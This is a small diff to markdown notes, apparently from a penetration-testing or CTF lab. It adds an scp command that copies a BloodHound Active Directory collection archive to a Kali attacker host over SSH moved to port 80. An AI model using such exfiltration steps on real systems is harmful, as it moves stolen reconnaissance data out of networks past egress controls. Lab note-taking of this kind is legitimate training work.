@@ -44,3 +44,7 @@ sudo vim /etc/ssh/sshd_config
 Change the port from 22 to 80:
 sudo service ssh restart
 ```
+### SCP file transfer
+```
+scp -P 80 20250425032703_BloodHound.zip kali@10.10.14.3:/home/kali/Desktop/20250425032703_BloodHound.zip
+```
